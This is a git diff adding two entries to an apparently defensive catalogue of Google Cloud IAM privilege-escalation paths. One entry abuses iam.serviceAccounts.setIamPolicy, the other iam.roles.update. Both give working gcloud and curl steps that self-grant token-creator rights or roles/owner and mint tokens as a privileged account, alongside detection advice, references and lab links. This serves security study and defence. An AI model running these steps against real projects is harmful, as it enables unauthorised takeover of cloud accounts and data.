@@ -13700,6 +13700,8 @@
       }
     ],
     "relatedPaths": [
+      "gcp-iam-002",
+      "gcp-iam-003",
       "sts-001"
     ],
     "detectionTools": {
@@ -13791,7 +13793,7 @@
     },
     "gitMetadata": {
       "created": "2026-10-08T11:30:45Z",
-      "lastUpdated": "2026-11-11T01:35:00Z",
+      "lastUpdated": "2026-11-12T19:26:08Z",
       "contributors": [
         {
           "name": "Seth Art",
@@ -13801,6 +13803,390 @@
       ]
     },
     "filePath": "data/paths/gcp/iam/gcp-iam-001.yaml",
+    "cloud": "gcp"
+  },
+  {
+    "id": "gcp-iam-002",
+    "name": "iam.serviceAccounts.setIamPolicy",
+    "category": "principal-access",
+    "services": [
+      "iam"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam.serviceAccounts.setIamPolicy",
+          "resourceConstraints": "Must be granted on the target service account, either via a custom role scoped to this permission or the predefined `roles/iam.serviceAccountAdmin` role"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam.serviceAccounts.getIamPolicy",
+          "resourceConstraints": "Required only by `gcloud iam service-accounts add-iam-policy-binding`, which reads the target service account's existing IAM policy before merging and writing it back; not needed via the raw `setIamPolicy` REST API, which accepts a full policy body constructed from scratch"
+        },
+        {
+          "permission": "iam.serviceAccounts.list",
+          "resourceConstraints": "Helpful for enumerating service accounts in the project to identify setIamPolicy targets"
+        }
+      ]
+    },
+    "description": "A principal holding `iam.serviceAccounts.setIamPolicy` on a service account can overwrite that account's IAM policy to add a `roles/iam.serviceAccountTokenCreator` binding for itself, then call `generateAccessToken` to mint a short-lived OAuth token that authenticates as the target. If the target service account holds a privileged project role such as `roles/editor`, the attacker inherits all of its permissions through chained impersonation -- without ever needing a long-lived key or executing code on a workload. Writing a service account's IAM policy is functionally equivalent to holding that account's credentials.",
+    "prerequisites": {
+      "admin": [
+        "A target service account must exist that the attacker's principal holds `iam.serviceAccounts.setIamPolicy` on, whether via a custom role or the predefined `roles/iam.serviceAccountAdmin` role",
+        "The target service account must hold administrative permissions at the project level (e.g., `roles/owner`, `roles/editor`, or an equivalent custom role)"
+      ],
+      "lateral": [
+        "A target service account must exist that the attacker's principal holds `iam.serviceAccounts.setIamPolicy` on, whether via a custom role or the predefined `roles/iam.serviceAccountAdmin` role"
+      ]
+    },
+    "exploitationSteps": {
+      "gcloud": [
+        {
+          "step": 1,
+          "command": "gcloud iam service-accounts list \\\n  --project=PROJECT_ID \\\n  --format='value(email)'\n",
+          "description": "Enumerate service accounts to identify potential setIamPolicy targets. This reconnaissance requires the additional `iam.serviceAccounts.list` permission."
+        },
+        {
+          "step": 2,
+          "command": "gcloud iam service-accounts add-iam-policy-binding \\\n  TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \\\n  --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \\\n  --role=roles/iam.serviceAccountTokenCreator\n",
+          "description": "Self-grant `roles/iam.serviceAccountTokenCreator` on the target service account by rewriting its IAM policy. `gcloud add-iam-policy-binding` performs a read-modify-write: it reads the existing policy first (`iam.serviceAccounts.getIamPolicy`), merges the new binding, and writes it back, so it requires the additional `iam.serviceAccounts.getIamPolicy` permission."
+        },
+        {
+          "step": 3,
+          "command": "gcloud auth print-access-token \\\n  --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com\n",
+          "description": "Mint a short-lived OAuth access token for the target service account using the newly-granted `roles/iam.serviceAccountTokenCreator`"
+        },
+        {
+          "step": 4,
+          "command": "gcloud PROJECT_RESOURCE_COMMAND \\\n  --project=PROJECT_ID \\\n  --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com\n",
+          "description": "Run a Google Cloud command as the target service account to exercise whatever project or resource permissions it holds"
+        }
+      ],
+      "curl": [
+        {
+          "step": 1,
+          "command": "curl -sS -X POST \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"policy\": {\n      \"bindings\": [{\n        \"role\": \"roles/iam.serviceAccountTokenCreator\",\n        \"members\": [\"serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com\"]\n      }]\n    }\n  }' \\\n  \"https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:setIamPolicy\"\n",
+          "description": "Self-grant `roles/iam.serviceAccountTokenCreator` on the target service account by POSTing a complete policy body to the `setIamPolicy` REST endpoint. Unlike `gcloud add-iam-policy-binding`, this does not require a prior `getIamPolicy` read -- the full policy is constructed from scratch, proving `iam.serviceAccounts.setIamPolicy` is the only required permission. Note that this replaces the entire policy, so any existing bindings not included will be removed."
+        },
+        {
+          "step": 2,
+          "command": "TARGET_TOKEN=$(curl -sS -X POST \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"scope\":[\"https://www.googleapis.com/auth/cloud-platform\"]}' \\\n  \"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:generateAccessToken\" \\\n  | jq -r '.accessToken')\n",
+          "description": "Mint a short-lived OAuth token for the target service account using the newly-granted `roles/iam.serviceAccountTokenCreator`, calling the IAM Credentials API directly"
+        },
+        {
+          "step": 3,
+          "command": "curl -H \"Authorization: Bearer $TARGET_TOKEN\" \\\n  \"https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID\"\n",
+          "description": "Use the minted token directly against Google APIs as the target service account"
+        }
+      ]
+    },
+    "recommendation": "Writing a service account's IAM policy (`iam.serviceAccounts.setIamPolicy`) is functionally equivalent to holding that account's credentials -- any principal that can rewrite the policy can self-grant `roles/iam.serviceAccountTokenCreator` and then mint tokens at will. This makes `setIamPolicy` grants across a privilege boundary as dangerous as direct impersonation grants.\n\n- **Avoid granting `iam.serviceAccounts.setIamPolicy` across privilege boundaries** - Never grant policy-write rights on a service account to a principal that should not otherwise hold that account's permissions, whether via `roles/iam.serviceAccountAdmin` or a custom role scoped to just `setIamPolicy`.\n- **Scope policy-management grants with IAM Conditions** - Restrict `setIamPolicy` bindings with time-bound or attribute-based conditions rather than granting unconditional, standing access:\n\n```json\n{\n  \"role\": \"roles/iam.serviceAccountAdmin\",\n  \"members\": [\"serviceAccount:admin-sa@PROJECT_ID.iam.gserviceaccount.com\"],\n  \"condition\": {\n    \"title\": \"time-bound-sa-admin\",\n    \"expression\": \"request.time < timestamp(\\\"2026-12-31T00:00:00Z\\\")\"\n  }\n}\n```\n\n- **Apply least privilege to service accounts that can be impersonated** - Replace broad primitive roles like `roles/editor` or `roles/owner` with narrowly scoped predefined or custom roles that grant only what the workload needs.\n- **Resolve custom roles when detecting `setIamPolicy` grants** - The permission can arrive through `roles/iam.serviceAccountAdmin` or a narrowly scoped custom role; detection logic that only checks predefined role names will miss the custom-role variant.\n- Monitor Cloud Audit Logs for `iam.googleapis.com/SetIamPolicy` events on service accounts where the new policy adds `roles/iam.serviceAccountTokenCreator` (or a custom role including `iam.serviceAccounts.getAccessToken`) for a principal that previously could not impersonate the account.\n- Monitor for `iam.googleapis.com/GenerateAccessToken` events immediately following a `SetIamPolicy` that granted the caller tokenCreator on the same service account -- this self-grant-then-impersonate pattern is a high-confidence signal of privilege escalation.\n- Monitor for `iam.googleapis.com/SetIamPolicy` events that grant `iam.serviceAccounts.setIamPolicy` (via `roles/iam.serviceAccountAdmin` or a custom role) at the project level, which would cover every service account in the project.\n- Regularly audit IAM bindings with Policy Analyzer / IAM Recommender to identify service accounts whose policies can be written by lower-privilege principals.\n",
+    "limitations": "This path provides administrative access only if the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. If the target only has narrowly scoped permissions, the attacker inherits only those, though even limited additional access may enable further multi-hop escalation. Note that `roles/editor` and `roles/viewer` deliberately exclude Secret Manager payload access (`secretmanager.versions.access`), so reaching secrets specifically requires the target to also hold an explicit `roles/secretmanager.secretAccessor` grant.\n\nThe `setIamPolicy` call replaces the entire IAM policy on the service account, not just appending a binding. The `gcloud add-iam-policy-binding` read-modify-write approach preserves existing bindings, while a raw `setIamPolicy` call that constructs the policy from scratch may remove them. In practice, the attacker only needs their own tokenCreator binding to succeed, so replacing the entire policy is viable.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Spencer Gietzen",
+        "organization": "Rhino Security Labs",
+        "date": 2020,
+        "link": "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/"
+      }
+    },
+    "references": [
+      {
+        "title": "Privilege Escalation in Google Cloud Platform - Part 2 (SetIamPolicy) - Rhino Security Labs",
+        "url": "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/"
+      },
+      {
+        "title": "GCP - IAM Privesc - HackTricks Cloud",
+        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-iam-privesc.html"
+      },
+      {
+        "title": "GCPwn CAN_MODIFY_SA_IAM OpenGraph edge - Scott Weston / NetSPI",
+        "url": "https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L127-L135"
+      }
+    ],
+    "detectionTools": {
+      "gcpwn": "https://github.com/NetSPI/gcpwn/blob/main/gcpwn/mappings/og_defined_edges.json#L135",
+      "rhino-gcp-privesc": "https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/PrivEscScanner/check_for_privesc.py#L238",
+      "purplepanda": "https://github.com/carlospolop/PurplePanda/blob/master/intel/google/info/privesc.yaml#L51"
+    },
+    "relatedPaths": [
+      "gcp-iam-001",
+      "gcp-iam-003"
+    ],
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "modules/scenarios/gcp/single-account/privesc-one-hop/to-admin/gcp-iam-002-iam-serviceaccountssetiampolicy",
+        "description": "Deploy Terraform into your own GCP project to practice this attack path"
+      }
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Service Account",
+          "type": "principal",
+          "description": "The attacker's starting service account. It holds no project-level roles of its own, but has been granted `iam.serviceAccounts.setIamPolicy` on a second, privileged service account, either via the predefined `roles/iam.serviceAccountAdmin` role or a custom role scoped to just this permission. Writing a service account's IAM policy is functionally equivalent to holding that account's credentials."
+        },
+        {
+          "id": "target_sa",
+          "label": "Target Service Account",
+          "type": "principal",
+          "description": "The privileged service account whose IAM policy the attacker overwrites. The attacker first calls `setIamPolicy` to add a `roles/iam.serviceAccountTokenCreator` binding for itself on this account, then calls `generateAccessToken` to mint a short-lived OAuth token that authenticates as this service account. What the attacker actually gains depends entirely on what project-level roles this service account holds at the time of the attack.\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "color": "#99ff99",
+          "description": "The target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role at the project level. Impersonating it grants the attacker administrative control over the project. Note that `roles/editor` alone does not include Secret Manager payload access (`secretmanager.versions.access`), so reaching a specific secret's value also requires the target to hold an explicit `roles/secretmanager.secretAccessor` grant on that secret."
+        },
+        {
+          "id": "limited_access",
+          "label": "Limited Additional Access",
+          "type": "outcome",
+          "color": "#ffeb99",
+          "description": "The target service account holds narrower, non-administrative permissions, such as access to a specific resource or service. Impersonating it grants only that scoped access, which may still enable further lateral movement or multi-hop escalation."
+        },
+        {
+          "id": "no_access",
+          "label": "No Additional Access",
+          "type": "outcome",
+          "color": "#cccccc",
+          "description": "The target service account holds minimal or no meaningful permissions beyond what the attacker's starting principal already had, so impersonating it provides no material benefit."
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "target_sa",
+          "label": "iam.serviceAccounts.setIamPolicy",
+          "description": "The attacker overwrites the target service account's IAM policy to add a `roles/iam.serviceAccountTokenCreator` binding for itself, then mints a short-lived OAuth token to authenticate as the target.\n\nStep 1 -- Self-grant tokenCreator on the target SA:\n```bash\ngcloud iam service-accounts add-iam-policy-binding \\\n  TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \\\n  --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \\\n  --role=roles/iam.serviceAccountTokenCreator\n```\n\nStep 2 -- Mint a token as the target SA:\n```bash\ngcloud auth print-access-token \\\n  --impersonate-service-account=TARGET_SA@PROJECT_ID.iam.gserviceaccount.com\n```\n\nThe `gcloud add-iam-policy-binding` wrapper performs a read-modify-write and requires the additional `iam.serviceAccounts.getIamPolicy` permission. The raw `setIamPolicy` REST API accepts a full policy body constructed from scratch, proving `iam.serviceAccounts.setIamPolicy` is the only required permission.\n"
+        },
+        {
+          "from": "target_sa",
+          "to": "admin",
+          "label": "If target holds roles/editor or roles/owner",
+          "branch": "A",
+          "condition": "admin",
+          "description": "If the target service account holds `roles/owner`, `roles/editor`, or an equivalent administrative custom role, the attacker inherits effective administrative control over the project for the lifetime of the minted token. The attacker can continue minting new tokens as long as the self-granted `roles/iam.serviceAccountTokenCreator` binding remains in place."
+        },
+        {
+          "from": "target_sa",
+          "to": "limited_access",
+          "label": "If target holds narrower permissions",
+          "branch": "B",
+          "condition": "some_permissions",
+          "description": "If the target service account holds only narrowly scoped permissions, such as access to a specific Cloud Storage bucket or BigQuery dataset, the attacker inherits that limited access. Even limited additional access may enable further lateral movement or multi-hop escalation to higher-privilege principals."
+        },
+        {
+          "from": "target_sa",
+          "to": "no_access",
+          "label": "If target holds minimal permissions",
+          "branch": "C",
+          "condition": "no_permissions",
+          "description": "If the target service account has no meaningful permissions beyond the attacker's own, impersonating it provides no additional access. The attacker may still attempt to enumerate other service accounts where they hold `setIamPolicy` to find a more privileged target."
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-11-12T19:26:08Z",
+      "lastUpdated": "2026-11-12T19:26:08Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        }
+      ]
+    },
+    "filePath": "data/paths/gcp/iam/gcp-iam-002.yaml",
+    "cloud": "gcp"
+  },
+  {
+    "id": "gcp-iam-003",
+    "name": "iam.roles.update",
+    "category": "self-escalation",
+    "services": [
+      "iam"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam.roles.update",
+          "resourceConstraints": "Must be granted on a project custom role that the attacker's principal is also a member of, enabling the principal to edit the role it holds"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam.roles.get",
+          "resourceConstraints": "Required only by `gcloud iam roles update --add-permissions`, which reads the role's current `includedPermissions` before writing the appended list; not needed via the raw `roles.patch` REST API, which replaces `includedPermissions` wholesale"
+        },
+        {
+          "permission": "iam.roles.list",
+          "resourceConstraints": "Helpful for enumerating project custom roles to identify which bound role is editable"
+        },
+        {
+          "permission": "resourcemanager.projects.get",
+          "resourceConstraints": "Helpful for confirming the current project context and the lack of direct admin roles"
+        },
+        {
+          "permission": "resourcemanager.projects.getIamPolicy",
+          "resourceConstraints": "Required only by `gcloud projects add-iam-policy-binding`, which reads the project IAM policy before writing it back; not needed via the raw `setIamPolicy` REST API"
+        }
+      ]
+    },
+    "description": "A principal bound to a project custom role that also grants `iam.roles.update` on that role can edit the role's `includedPermissions` to add any permission -- most critically `resourcemanager.projects.setIamPolicy`. Because the principal is a member of the role, it instantly inherits the newly-added permission after IAM propagation. It then uses `resourcemanager.projects.setIamPolicy` to self-bind `roles/owner` on the project, achieving full project administrator access. The key vulnerability is the self-reference: the principal holds the role and can update the role, turning a least-privilege custom role into an open-ended permission vending machine.",
+    "prerequisites": [
+      "A project custom role must exist that includes `iam.roles.update` on itself",
+      "The attacker's principal must be a member of (bound to) that same custom role"
+    ],
+    "exploitationSteps": {
+      "gcloud": [
+        {
+          "step": 1,
+          "command": "gcloud iam roles list \\\n  --project=PROJECT_ID\n",
+          "description": "Enumerate project custom roles to identify a role the attacker is bound to and can update. This reconnaissance requires the additional `iam.roles.list` permission."
+        },
+        {
+          "step": 2,
+          "command": "gcloud iam roles describe CUSTOM_ROLE_ID \\\n  --project=PROJECT_ID\n",
+          "description": "Describe the editable custom role to confirm it grants `iam.roles.update`. This requires the additional `iam.roles.get` permission, which `gcloud iam roles update --add-permissions` also calls internally in step 3."
+        },
+        {
+          "step": 3,
+          "command": "gcloud iam roles update CUSTOM_ROLE_ID \\\n  --project=PROJECT_ID \\\n  --add-permissions=resourcemanager.projects.setIamPolicy\n",
+          "description": "Add `resourcemanager.projects.setIamPolicy` to the custom role. Because the attacker is a member of this role, they instantly inherit the newly-added permission after IAM propagation (~15 seconds). `gcloud iam roles update --add-permissions` reads the role first (`iam.roles.get`), so it requires that additional permission."
+        },
+        {
+          "step": 4,
+          "command": "gcloud projects add-iam-policy-binding PROJECT_ID \\\n  --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \\\n  --role=roles/owner\n",
+          "description": "Self-bind `roles/owner` on the project using the newly-acquired `resourcemanager.projects.setIamPolicy` permission. `gcloud projects add-iam-policy-binding` reads the project IAM policy first (`resourcemanager.projects.getIamPolicy`), so it requires that additional permission."
+        },
+        {
+          "step": 5,
+          "command": "gcloud PROJECT_RESOURCE_COMMAND \\\n  --project=PROJECT_ID\n",
+          "description": "Run any Google Cloud command as the escalated principal, which now holds `roles/owner` on the project"
+        }
+      ],
+      "curl": [
+        {
+          "step": 1,
+          "command": "curl -sS -X PATCH \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"includedPermissions\": [\n      \"iam.roles.update\",\n      \"resourcemanager.projects.setIamPolicy\"\n    ]\n  }' \\\n  \"https://iam.googleapis.com/v1/projects/PROJECT_ID/roles/CUSTOM_ROLE_ID?updateMask=includedPermissions\"\n",
+          "description": "Add `resourcemanager.projects.setIamPolicy` to the custom role by PATCHing its `includedPermissions` via the raw `roles.patch` API. Unlike `gcloud iam roles update --add-permissions`, this replaces the entire permission list without reading the role first, so `iam.roles.get` is not required. Include all existing permissions in the list to avoid removing them."
+        },
+        {
+          "step": 2,
+          "command": "curl -sS -X POST \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"policy\": {\n      \"bindings\": [\n        EXISTING_BINDINGS,\n        {\n          \"role\": \"roles/owner\",\n          \"members\": [\"serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com\"]\n        }\n      ]\n    }\n  }' \\\n  \"https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy\"\n",
+          "description": "Self-bind `roles/owner` on the project using the raw `setIamPolicy` REST API. Unlike `gcloud projects add-iam-policy-binding`, this does not require a prior `getIamPolicy` read -- but including existing bindings in the policy body is recommended to avoid removing them."
+        },
+        {
+          "step": 3,
+          "command": "curl -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID\"\n",
+          "description": "Verify `roles/owner` access by querying the project as the escalated principal"
+        }
+      ]
+    },
+    "recommendation": "Granting `iam.roles.update` to a principal that is also a member of the updated role creates a self-referential escalation path -- the principal can add any permission to the role and instantly inherit it, making the custom role boundary meaningless.\n\n- **Never bind a principal to a custom role it can also update** - Break the self-reference. If a principal must administer roles, ensure it is not itself a member of the roles it can edit. Keep role-administration permissions in a separate, tightly-held identity.\n- **Restrict `iam.roles.update` to dedicated administrators** - Treat role-editing permissions as administrative. Use predefined roles like `roles/iam.roleAdmin` only for break-glass or platform-team identities, never for workload service accounts.\n- **Use IAM Conditions to scope role-administration bindings** - Add time-bound or resource-constrained conditions so standing, unconditional role-edit access is not granted:\n\n```json\n{\n  \"role\": \"roles/iam.roleAdmin\",\n  \"members\": [\"serviceAccount:platform-admin@PROJECT_ID.iam.gserviceaccount.com\"],\n  \"condition\": {\n    \"title\": \"time-bound-role-admin\",\n    \"expression\": \"request.time < timestamp(\\\"2026-12-31T00:00:00Z\\\")\"\n  }\n}\n```\n\n- **Monitor for changes to custom role `includedPermissions`** - Especially additions of high-impact permissions such as `resourcemanager.projects.setIamPolicy`, `iam.serviceAccounts.getAccessToken`, or `iam.serviceAccounts.setIamPolicy`.\n- Monitor Cloud Audit Logs for `iam.googleapis.com/UpdateRole` events where the modification adds high-impact permissions and the caller is a member of the updated role -- the signature of this self-escalation.\n- Monitor for `cloudresourcemanager.googleapis.com/SetIamPolicy` events that add `roles/owner` or `roles/editor` bindings, especially when the member being added is the same identity making the call (self-binding).\n- Monitor for the sequential pattern: `UpdateRole` adding `resourcemanager.projects.setIamPolicy`, followed within seconds by a `SetIamPolicy` self-binding `roles/owner`, followed by access to previously-denied resources.\n- Use Policy Analyzer / IAM Recommender to identify identities that hold effective `iam.roles.update` on a custom role they are also bound to -- the core of this vulnerability.\n",
+    "limitations": "This path requires the specific combination of (1) the attacker being a member of a custom role and (2) that same custom role granting `iam.roles.update` on itself. If the custom role grants `iam.roles.update` on a different role that the attacker does not hold, editing it does not directly benefit the attacker.\n\n`resourcemanager.projects.setIamPolicy` is not a starting permission -- it is manufactured mid-attack by editing the custom role. Detection based solely on starting permissions would miss this path; effective detection must model the permissions an identity can grant itself.\n\nAfter self-binding `roles/owner`, the attacker has full project administrator access. `roles/owner` includes `secretmanager.versions.access`, so unlike `roles/editor`, no additional `secretAccessor` grant is needed to read Secret Manager payloads.\n",
+    "discoveryAttribution": {
+      "firstDocumented": {
+        "author": "Spencer Gietzen",
+        "organization": "Rhino Security Labs",
+        "date": 2020,
+        "link": "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
+      }
+    },
+    "references": [
+      {
+        "title": "Privilege Escalation in Google Cloud Platform - Part 1 (IAM) - Rhino Security Labs",
+        "url": "https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/"
+      },
+      {
+        "title": "RhinoSecurityLabs/GCP-IAM-Privilege-Escalation - iam.roles.update exploit script",
+        "url": "https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.roles.update.py"
+      },
+      {
+        "title": "GCP - IAM Privesc - HackTricks Cloud",
+        "url": "https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-iam-privesc.html"
+      },
+      {
+        "title": "GCPwn UPDATE_CUSTOM_ROLE_ADD_PERMISSIONS OpenGraph edge - Scott Weston / NetSPI",
+        "url": "https://github.com/NetSPI/gcpwn/blob/acabc59d87fdc5dca86d919aa72faf7a628e2e9a/gcpwn/mappings/og_defined_edges.json#L68-L87"
+      }
+    ],
+    "detectionTools": {
+      "gcpwn": "https://github.com/NetSPI/gcpwn/blob/main/gcpwn/mappings/og_defined_edges.json#L81",
+      "rhino-gcp-privesc": "https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/PrivEscScanner/check_for_privesc.py#L8"
+    },
+    "relatedPaths": [
+      "gcp-iam-001",
+      "gcp-iam-002"
+    ],
+    "learningEnvironments": {
+      "pathfinding-labs": {
+        "type": "open-source",
+        "githubLink": "https://github.com/DataDog/pathfinding-labs",
+        "scenario": "modules/scenarios/gcp/single-account/privesc-self-escalation/to-admin/gcp-iam-003-iam-rolesupdate",
+        "description": "Deploy Terraform into your own GCP project to practice this attack path"
+      }
+    },
+    "attackVisualization": {
+      "nodes": [
+        {
+          "id": "start",
+          "label": "Starting Service Account",
+          "type": "principal",
+          "description": "The attacker's starting service account. It holds no project-level roles of its own (no `roles/owner`, `roles/editor`, etc.), but it is bound to a project custom role that grants `iam.roles.update` on that same role. This self-referential binding is the core vulnerability: the SA can edit the permissions of the role it holds, effectively granting itself arbitrary permissions.\n"
+        },
+        {
+          "id": "custom_role",
+          "label": "Editable Custom Role",
+          "type": "resource",
+          "description": "A project custom role (e.g., `gcp_iam_003_editable`) that the starting service account is bound to. The role initially grants only `iam.roles.update` (scoped to itself), but because the SA can edit its `includedPermissions`, the role becomes a permission vending machine. The attacker adds `resourcemanager.projects.setIamPolicy` to the role, and the SA instantly inherits it after IAM propagation (~15 seconds).\n"
+        },
+        {
+          "id": "admin",
+          "label": "Effective Administrator",
+          "type": "outcome",
+          "description": "The starting service account has self-bound `roles/owner` on the project using the `resourcemanager.projects.setIamPolicy` permission it manufactured by editing its own custom role. It now has full project administrator access, including `secretmanager.versions.access` (unlike `roles/editor`, which excludes it). The entire escalation is performed by a single principal with no lateral movement.\n"
+        }
+      ],
+      "edges": [
+        {
+          "from": "start",
+          "to": "custom_role",
+          "label": "iam.roles.update",
+          "description": "The starting service account calls `iam.roles.update` on the custom role it is bound to, adding `resourcemanager.projects.setIamPolicy` to the role's `includedPermissions`. This is the key self-referential action: the SA edits the very role it holds.\n\nCommand:\n```bash\ngcloud iam roles update CUSTOM_ROLE_ID \\\n  --project=PROJECT_ID \\\n  --add-permissions=resourcemanager.projects.setIamPolicy\n```\n\nThe `gcloud iam roles update --add-permissions` variant requires the additional `iam.roles.get` permission (it reads the role first). The raw `roles.patch` REST API replaces `includedPermissions` wholesale and does not require `iam.roles.get`.\n"
+        },
+        {
+          "from": "custom_role",
+          "to": "start",
+          "label": "Inherits new permissions",
+          "description": "Because the starting service account is a member of the custom role, it instantly inherits `resourcemanager.projects.setIamPolicy` after IAM propagation (~15 seconds). No additional API call is needed -- the permission is granted automatically through the existing role binding. The SA now holds a permission it was never explicitly granted; it manufactured it by editing its own role.\n"
+        },
+        {
+          "from": "start",
+          "to": "admin",
+          "label": "resourcemanager.projects.setIamPolicy",
+          "description": "The starting service account uses the newly-inherited `resourcemanager.projects.setIamPolicy` permission to self-bind `roles/owner` on the project. This is a single API call that adds the SA to the project IAM policy with the `roles/owner` role.\n\nCommand:\n```bash\ngcloud projects add-iam-policy-binding PROJECT_ID \\\n  --member=serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com \\\n  --role=roles/owner\n```\n\nAfter IAM propagation, the SA has full project administrator access. `roles/owner` includes `secretmanager.versions.access`, so no additional grant is needed to read Secret Manager payloads.\n"
+        }
+      ]
+    },
+    "gitMetadata": {
+      "created": "2026-11-12T19:26:08Z",
+      "lastUpdated": "2026-11-12T19:26:08Z",
+      "contributors": [
+        {
+          "name": "Seth Art",
+          "email": "seth.art@datadoghq.com",
+          "githubUsername": "sethsec"
+        }
+      ]
+    },
+    "filePath": "data/paths/gcp/iam/gcp-iam-003.yaml",
     "cloud": "gcp"
   },
   {
